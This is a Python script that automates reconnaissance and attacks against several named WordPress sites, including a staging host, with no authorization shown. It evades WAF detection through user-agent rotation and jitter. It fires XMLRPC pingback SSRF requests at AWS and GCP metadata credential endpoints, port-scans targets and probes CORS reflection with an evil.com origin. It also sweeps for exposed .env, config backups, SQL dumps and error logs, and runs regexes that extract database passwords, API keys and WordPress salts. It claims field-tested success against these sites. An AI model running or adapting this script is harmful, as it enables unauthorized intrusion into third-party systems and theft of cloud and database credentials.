#!/usr/bin/env python3
"""
WordPress Multi-Target Deep Probe Script
Reusable across 5+ WordPress targets with integrated OPSEC controls.

╔══════════════════════════════════════════════════════════════════╗
║  ⚠ DNS TIMEOUT PITFALL                                          ║
║  requests.get(url, timeout=N) does NOT cover DNS resolution.     ║
║  When probing subdomains that may not resolve (staging.*,        ║
║  dev.*, api.* found via crt.sh), DNS can hang for 30-60s.        ║
║                                                                  ║
║  FIX: socket.setdefaulttimeout(10) is set at module init below.  ║
║  For even safer subdomain probes, use curl subprocess:           ║
║    subprocess.run(["curl","-sk","--max-time","8",url])           ║
╚══════════════════════════════════════════════════════════════════╝

Usage:
  python3 wp-multi-deep-probe.py [target1.com target2.com ...]

If no targets provided, runs against a default set.

OPSEC:
  - 2-3s jitter per request (rate_limit())
  - 6 rotating User-Agents (get_ua())
  - 429/503 → 30s backoff
  - Same-domain serialization (no concurrency)
  - All output written to wave5/ directory

Field-tested: Wave 5 Deep Invade — 99 requests across 5 targets, zero WAF blocks.
"""
import requests
import random
import time
import json
import os
import re
import sys
import socket as _socket
from collections import Counter
from datetime import datetime, UTC

# ⚠ DNS TIMEOUT FIX: requests.get(url, timeout=N) does NOT cover DNS.
# Without this, probing unresolved subdomains hangs indefinitely.
_socket.setdefaulttimeout(10)

OUTPUT_DIR = "/root/output/recon_us/deep/wave5"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ── OPSEC: User-Agent Rotation ──────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0 Safari/537.36",
]
_ua_idx = 0

def get_ua():
    global _ua_idx
    ua = USER_AGENTS[_ua_idx % len(USER_AGENTS)]
    _ua_idx += 1
    return ua

# ── OPSEC: Rate Limiting ────────────────────────────────────
_total_reqs = 0

def rate_limit():
    global _total_reqs
    time.sleep(2.0 + random.random() * 1.0)  # 2-3s jitter
    _total_reqs += 1
    if _total_reqs % 50 == 0:
        print(f"  [rate] {_total_reqs} total requests", flush=True)

# ── OPSEC: Single-Request Function ──────────────────────────
def req(url, method="GET", data=None, headers=None, timeout=15, allow_redirects=True):
    """Make a single request with full OPSEC controls."""
    rate_limit()
    hdrs = {
        "User-Agent": get_ua(),
        "Accept": "text/html,application/json,*/*",
        "Accept-Language": "en-US,en;q=0.9",
    }
    if headers:
        hdrs.update(headers)
    try:
        if method == "GET":
            r = requests.get(url, headers=hdrs, timeout=timeout, verify=False, allow_redirects=allow_redirects)
        elif method == "POST":
            r = requests.post(url, headers=hdrs, data=data, timeout=timeout, verify=False, allow_redirects=allow_redirects)
        elif method == "HEAD":
            r = requests.head(url, headers=hdrs, timeout=timeout, verify=False, allow_redirects=allow_redirects)
        else:
            r = requests.request(method, url, headers=hdrs, data=data, timeout=timeout, verify=False, allow_redirects=allow_redirects)
        # Back off on 429/503
        if r.status_code in (429, 503):
            print(f"  [429/503] Backing off 30s for {url}")
            time.sleep(30)
        return r
    except requests.exceptions.ConnectionError:
        return type('R', (), {'status_code': 0, 'text': '', 'headers': {}, 'elapsed': type('E',(),{'total_seconds':lambda s:0})()})()
    except requests.exceptions.Timeout:
        return type('R', (), {'status_code': 0, 'text': 'TIMEOUT', 'headers': {}, 'elapsed': type('E',(),{'total_seconds':lambda s:0})()})()

# ── Error Log Deep Credential Extraction ────────────────────
def scan_error_log(log_text):
    """
    Deep-analyze a PHP error_log for credentials, tokens, and secrets.
    
    Extracts:
    - Server paths (docroot, user, hosting provider)
    - Email addresses
    - Database credentials (DB_USER, DB_PASSWORD, DB_HOST, DB_NAME)
    - API keys (Stripe sk_, Google AIza, AWS AKIA, JWT tokens)
    - SQL queries
    - WordPress salts and nonce keys
    - PHP error type breakdown with counts
    - Date range analysis
    
    Returns dict with all findings.
    
    Field-tested on wines.com 1.7MB error_log (47 server paths found).
    """
    findings = {}
    
    # Server paths (reveal docroot, user, hosting provider)
    paths = set(re.findall(r'/home/[^\s:)]+', log_text))
    paths |= set(re.findall(r'/var/www/[^\s:)]+', log_text))
    findings['server_paths'] = sorted(paths)
    
    # Email addresses
    emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', log_text))
    findings['emails'] = sorted(emails)
    
    # Database credentials
    db_creds = set()
    for pat in [r"DB_USER[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_PASSWORD[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_HOST[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_NAME[^=]*=[\s'\"]*([^'\";\s]+)"]:
        for m in re.findall(pat, log_text):
            db_creds.add(m)
    findings['db_credentials'] = sorted(db_creds)
    
    # API keys and tokens
    api_keys = set()
    for pat in [r'sk-[a-zA-Z0-9]{20,60}',        # Stripe secret key
                r'AIza[0-9A-Za-z_-]{35}',         # Google API key
                r'AKIA[0-9A-Z]{16}',              # AWS access key
                r'pk_[a-zA-Z0-9]+',               # Stripe publishable key
                r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',  # JWT
                r'(?i)(?:api[_-]?key|apikey|api_key)\s*[=:]\s*["\\x27]([^"\\x27]{8,})["\\x27]', # Generic API key
                ]:
        for m in re.findall(pat, log_text):
            api_keys.add(str(m)[:80])
    findings['api_keys'] = sorted(api_keys)
    
    # SQL queries
    sql_queries = re.findall(
        r'(?:SELECT|INSERT|UPDATE|DELETE|CREATE TABLE|ALTER TABLE|DROP TABLE)[^;]{0,300}',
        log_text, re.IGNORECASE
    )
    findings['sql_queries'] = sql_queries[:20]
    
    # WordPress salts
    salts = re.findall(
        r"(?:AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|"
        r"AUTH_SALT|SECURE_AUTH_SALT|LOGGED_IN_SALT|NONCE_SALT)[^,;]+",
        log_text
    )
    findings['wp_salts'] = salts
    
    # PHP error type breakdown
    error_types = re.findall(r'PHP\s+\w+:', log_text)
    findings['error_types'] = Counter(error_types).most_common(10)
    
    # Date range
    dates = re.findall(r'\[(\d{2}-\w{3}-\d{4})', log_text)
    if dates:
        findings['date_range'] = {'first': dates[0], 'last': dates[-1], 'unique': len(set(dates))}
    
    # File paths with line numbers
    file_paths = set(re.findall(r'(?:in |on line )\S+\.php', log_text))
    findings['file_paths'] = sorted(file_paths)[:30]
    
    return findings


# ── XMLRPC SSRF Matrix — Test ALL 15 Metadata/Internal Endpoints ──
def xmlrpc_ssrf_matrix(host, xmlrpc_path="/xmlrpc.php"):
    """
    Test ALL cloud metadata and internal SSRF endpoints via XMLRPC pingback.
    
    Tests 15 endpoints: AWS IMDSv1 full paths, GCP metadata, localhost ports.
    Returns dict mapping SSRF target -> faultCode interpretation.
    
    Fault code meanings:
    - faultCode 0 = SSRF ACCEPTED (server attempted to fetch the URL)
    - faultCode 17 = source post not found but pingback mechanism active
    - faultCode 32 = pingback disabled or URL blocked
    
    Field-tested on staging.biglots.com (ALL 15 targets returned faultCode 0)
    and realpro.com (3 targets returned faultCode 0).
    """
    ssrf_targets = [
        # AWS IMDSv1
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        # GCP metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        # Localhost internal ports
        "http://127.0.0.1/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:9000/",
        "http://localhost/",
        "http://localhost:8080/",
        "http://localhost:9000/",
    ]
    
    results = {}
    for st in ssrf_targets:
        xml_body = f'''<?xml version="1.0"?>
<methodCall><methodName>pingback.ping</methodName>
<params>
<param><value><string>{st}</string></value></param>
<param><value><string>https://{host}/test</string></value></param>
</params></methodCall>'''
        r = req(f"https://{host}{xmlrpc_path}", method="POST",
                data=xml_body, headers={"Content-Type": "text/xml"})
        if '<int>0</int>' in r.text:
            results[st] = "faultCode 0 — SSRF ACCEPTED"
        elif '<int>' in r.text:
            m = re.search(r'<int>(\d+)</int>', r.text)
            results[st] = f"faultCode {m.group(1)}" if m else "no_fault"
        else:
            results[st] = "no_fault"
    
    return results


# ── Port Scan with HTTP Probe ───────────────────────────────
def port_scan_http(host, ports=None, http_paths=None):
    """
    Port scan a target with automatic HTTP probe on open ports.
    
    Scans each port, then tries common service paths on open ports:
    /, /api/, /login, /admin, /health, /swagger.json, /graphql, /info
    
    Field-tested on patientportal.com (7 ports found open: 80, 443, 8080-8084, 22).
    """
    import socket as _socket
    ports = ports or [80, 443, 3000, 5000, 8000, 8080, 8081, 8082, 8083, 8084, 8085,
                      8443, 8888, 9000, 9090, 9200, 5432, 6379, 27017, 22]
    http_paths = http_paths or ["/", "/api/", "/login", "/admin", "/health",
                                "/swagger.json", "/graphql", "/info"]
    
    results = {}
    for port in ports:
        sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        sock.settimeout(2)
        if sock.connect_ex((host, port)) == 0:
            sock.close()
            found = False
            for path in http_paths:
                r = req(f"https://{host}:{port}{path}", timeout=5)
                if r.status_code not in (0, 502, 503):
                    results[f"Port {port}{path}"] = f"HTTP {r.status_code} ({len(r.text)}B)"
                    found = True
                    break
            if not found:
                results[f"Port {port}"] = "OPEN (no HTTP response)"
        else:
            sock.close()
    return results


# ── CORS Matrix on Plugin-Specific Namespaces ───────────────
def cors_matrix(host, extra_endpoints=None):
    """
    Test CORS credential reflection across standard + plugin-specific endpoints.
    
    Returns dict mapping endpoint -> {status_code, acao, acac}
    
    Field-tested on restonic.com (solidwp-mail/v1, gf/v2 reflected evil.com with creds).
    """
    endpoints = [
        "/wp-json/wp/v2/users",
        "/wp-json/wp/v2/posts",
        "/wp-json/wp/v2/pages",
        "/wp-json/wp/v2/media",
        "/wp-json/wp/v2/settings",
        "/wp-json/wp-site-health/v1",
        "/wp-json/wc/v3/products",
        "/wp-json/wc/v3/orders",
        "/wp-json/wc/v3/customers",
        "/wp-json/gf/v2/",
        "/wp-json/gf/v2/forms",
        "/wp-json/gravity-pdf/v1/",
        "/wp-json/solidwp-mail/v1/",
        "/wp-json/solidwp-mail/v1/logs",
    ] + (extra_endpoints or [])
    
    results = {}
    for ep in endpoints:
        r = req(f"https://{host}{ep}", headers={"Origin": "https://evil.com"})
        acao = r.headers.get("Access-Control-Allow-Origin", "NONE")
        acac = r.headers.get("Access-Control-Allow-Credentials", "NONE")
        results[ep] = {
            'status_code': r.status_code,
            'acao': acao,
            'acac': acac,
            'credential_reflection': (acao != "NONE" and acac == "true")
        }
    return results


# ── Helpers ──────────────────────────────────────────────────
def write_finding(target, section, content):
    fname = os.path.join(OUTPUT_DIR, f"{target}_wave5.md")
    with open(fname, "a") as f:
        f.write(f"\n## {section}\n*{datetime.now(UTC).strftime('%Y-%m-%d %H:%M UTC')}*\n\n{content}\n")

def get_cors_headers(r):
    return {k: v for k, v in r.headers.items() if 'access-control' in k.lower()}

def scan_js_for_secrets(text):
    """Scan JS text for API keys, tokens, internal URLs."""
    findings = []
    patterns = [
        (r'(?i)(?:api[_-]?key|apikey|api_key)\s*[=:]\s*["\x27]([^"\x27]{8,})["\x27]', "API Key"),
        (r'https?://[a-zA-Z0-9.-]+:[0-9]{2,5}', "Internal URL with port"),
        (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', "JWT Token"),
        (r'AKIA[0-9A-Z]{16}', "AWS Access Key"),
        (r'(?i)(?:firebase|supabase)_[a-z]+\s*[=:]\s*["\x27]([^"\x27]+)', "Firebase/Supabase"),
        (r'(?i)password\s*[=:]\s*["\x27]([^"\x27]{4,})["\x27]', "Hardcoded Password"),
        (r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', "Internal IP (10.x.x.x)"),
        (r'192\.168\.\d{1,3}\.\d{1,3}', "Internal IP (192.168.x.x)"),
    ]
    for pat, desc in patterns:
        for m in re.findall(pat, text):
            val = str(m)[:80]
            findings.append(f"  [{desc}] {val}")
    return findings

# ── Per-Target Probe Functions ──────────────────────────────
# Each function follows the same structure:
#   1. Known incomplete chains from prior waves
#   2. New endpoints/parameters not yet checked
#   3. JS bundle download + scan
#   4. Sensitive file sweep
#   5. Write findings to file

def probe(target, host=None, paths=None, cors_eps=None, xmlrpc_paths=None,
          staging=None, js_limit=10):
    """
    Generic WordPress deep probe.
    
    Args:
        target: Target name (e.g., 'wines.com')
        host: Full hostname to probe (defaults to target)
        paths: Extra sensitive paths to check
        cors_eps: Extra CORS endpoints to test
        xmlrpc_paths: XMLRPC paths (e.g., ['/xmlrpc.php', '/magical/xmlrpc.php'])
        staging: (subdomain, paths) tuple for staging check
        js_limit: Max JS bundles to download
    """
    print(f"\n=== {target} ===")
    findings = []
    host = host or target
    
    # 1. CORS Credential Matrix (critical endpoints)
    print("  [CORS] Matrix scan...")
    for ep in (cors_eps or [
        "/wp-json/wp/v2/users", "/wp-json/wp/v2/posts",
        "/wp-json/wp/v2/pages", "/wp-json/wp/v2/media",
        "/wp-json/wp/v2/settings", "/wp-json/wp-site-health/v1",
        "/wp-json/gravity-pdf/v1/",
    ]):
        r = req(f"https://{host}{ep}", headers={"Origin": "https://evil.com"})
        cors = get_cors_headers(r)
        if cors:
            findings.append(f"- `{ep}` → HTTP {r.status_code} | CORS: {cors}\n")
    
    # 2. Sensitive File Sweep
    print("  [SENSITIVE] Path sweep...")
    sensitive_paths = [
        "/.env", "/.git/config", "/wp-config.php.bak", "/wp-config.php~",
        "/storage/logs/laravel.log", "/backup.sql", "/dump.sql",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
        "/sitemap.xml", "/robots.txt",
        "/wp-content/debug.log", "/error_log",
        "/readme.html", "/wp-cron.php", "/wp-login.php",
        "/author-sitemap.xml", "/wp-admin/admin-ajax.php",
    ] + (paths or [])
    for path in sensitive_paths:
        r = req(f"https://{host}{path}")
        if r.status_code == 200 and len(r.text) > 50:
            findings.append(f"### ACCESSIBLE: {path} — HTTP 200 ({len(r.text)}B)\n")
            preview = r.text[:200].replace('\n', ' ').strip()
            findings.append(f"  Preview: {preview}\n")
            print(f"    [!] {path}: HTTP 200 ({len(r.text)}B)")
    
    # 3. JS Bundle Download + Secret Scan
    print("  [JS] Downloading bundles...")
    r = req(f"https://{host}/")
    if r.status_code == 200:
        js_urls = re.findall(r'src="([^"]*\.js[^"]*)"', r.text)
        js_urls += re.findall(r"src='([^']*\.js[^']*)'", r.text)
        full_urls = []
        for js in js_urls:
            if js.startswith("http"): full_urls.append(js)
            elif js.startswith("//"): full_urls.append("https:" + js)
            else: full_urls.append(f"https://{host}{js}")
        findings.append(f"### JS Bundle Analysis ({len(full_urls)} scripts)\n")
        for js_url in full_urls[:js_limit]:
            r_js = req(js_url)
            if r_js.status_code == 200 and len(r_js.text) > 100:
                fname = os.path.basename(js_url.split('?')[0])
                jspath = os.path.join(OUTPUT_DIR, fname)
                with open(jspath, 'ab') as f:
                    f.write(r_js.content)
                secrets = scan_js_for_secrets(r_js.text)
                if secrets:
                    findings.append(f"**{fname}** ({len(r_js.text)}B)\n")
                    for s in secrets[:10]:
                        findings.append(f"{s}\n")
                    print(f"    [!] Secrets in {fname}: {len(secrets)}")
    
    # 4. XMLRPC Test
    print("  [XMLRPC] Testing...")
    for xpath in (xmlrpc_paths or ["/xmlrpc.php"]):
        # Test GET first
        r_get = req(f"https://{host}{xpath}")
        findings.append(f"### XMLRPC {xpath} — GET → HTTP {r_get.status_code}\n")
        # Always test via POST with XML content type
        xml_payload = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
        r_post = req(f"https://{host}{xpath}", method="POST",
                     data=xml_payload, headers={"Content-Type": "text/xml"})
        if r_post.status_code == 200 and len(r_post.text) > 100:
            methods = re.findall(r'<string>([^<]+)</string>', r_post.text)
            dangerous = ['system.multicall', 'wp.uploadFile', 'pingback.ping', 'wp.getUsers']
            found = [m for m in methods if any(d in m for d in dangerous)]
            findings.append(f"  POST → HTTP 200 | {len(methods)} methods | Dangerous: {', '.join(found)}\n")
            print(f"    [!] XMLRPC: {len(methods)} methods via POST, dangerous: {found}")
    
    # 5. Staging environment check
    if staging:
        subdomain, extra_paths = staging
        print(f"  [STAGING] Checking {subdomain}...")
        r = req(f"https://{subdomain}/")
        findings.append(f"### Staging: {subdomain} → HTTP {r.status_code} | {r.headers.get('Server','?')}\n")
        if r.status_code == 200:
            for path in extra_paths or ["/wp-json/", "/wp-json/wp/v2/users",
                                        "/xmlrpc.php", "/wp-login.php", "/robots.txt"]:
                r2 = req(f"https://{subdomain}{path}")
                findings.append(f"- {subdomain}{path} → HTTP {r2.status_code}\n")
                if r2.status_code == 200 and len(r2.text) > 100:
                    print(f"    [!] Staging accessible: {path} (HTTP {r2.status_code})")
    
    write_finding(target, "Wave 5 Deep Invade", "".join(findings))
    print(f"  [DONE] {target} — {len(findings)} finding items")

# ── Specialized Probes ──────────────────────────────────────
# These extend the generic probe with target-specific logic.

def probe_wines():
    probe("wines", host="www.wines.com",
          paths=["/magical/.env", "/magical/wp-content/debug.log",
                 "/magical/error_log", "/magical/wp-content/plugins/elementor/readme.txt",
                 "/magical/wp-content/plugins/elementskit/readme.txt"],
          xmlrpc_paths=["/xmlrpc.php", "/magical/xmlrpc.php"],
          cors_eps=[
              "/wp-json/wp/v2/users", "/wp-json/wp/v2/posts",
              "/wp-json/wp/v2/media", "/wp-json/wp/v2/settings",
              "/wp-json/wp-site-health/v1",
              "/wp-json/elementskit/v1/", "/wp-json/elementor/v1/",
          ])
    # Also check open registration
    r = req("https://www.wines.com/magical/wp-login.php?action=register", method="POST",
            data="user_login=test&user_email=test@mailinator.com&wp-submit=Register")
    write_finding("wines", "Open Registration Check",
                  f"- POST /magical/wp-login.php?action=register → HTTP {r.status_code}\n")

def probe_toolking():
    probe("toolking", paths=[
        "/wp-content/plugins/revslider/revslider.php",
        "/wp-content/plugins/revslider/readme.txt",
        "/wp-content/plugins/elementor/readme.txt",
    ], cors_eps=[
        "/wp-json/wp/v2/users", "/wp-json/wp/v2/posts",
        "/wp-json/wp/v2/media", "/wp-json/wp-site-health/v1",
        "/wp-json/elementor/v1/", "/wp-json/sliderrevolution/sliders/",
    ])
    # SliderRev REST API specific
    for ep in ["/wp-json/sliderrevolution/sliders/1",
               "/wp-json/sliderrevolution/sliders/slides/1"]:
        r = req(f"https://toolking.com{ep}")
        if r.status_code == 200:
            write_finding("toolking", "SliderRev REST",
                          f"- `{ep}` → HTTP 200 ({len(r.text)}B)\n{r.text[:500]}\n")

def probe_biglots():
    probe("biglots",
          staging=("staging.biglots.com", [
              "/wp-json/", "/wp-json/wp/v2/users", "/xmlrpc.php",
              "/wp-login.php", "/readme.html", "/robots.txt",
              "/author-sitemap.xml",
          ]),
          paths=["/author-sitemap.xml"])

# ── Main ─────────────────────────────────────────────────────
if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    
    targets = sys.argv[1:] if len(sys.argv) > 1 else []
    if not targets:
        # Default target set
        targets = ["wines.com", "toolking.com", "biglots.com"]
    
    print(f"WordPress Multi-Target Deep Probe")
    print(f"Targets: {targets}")
    print(f"Output: {OUTPUT_DIR}")
    print(f"Start: {datetime.now(UTC).strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print()
    
    dispatch = {
        "wines.com": probe_wines,
        "toolking.com": probe_toolking,
        "biglots.com": probe_biglots,
    }
    
    for t in targets:
        fn = dispatch.get(t)
        if fn:
            try:
                fn()
            except Exception as e:
                print(f"  ERROR on {t}: {e}", file=sys.stderr)
        else:
            # Generic probe for unknown targets
            probe(t)
    
    print(f"\nComplete — {_total_reqs} requests in {datetime.now(UTC).strftime('%Y-%m-%d %H:%M:%S')} UTC")
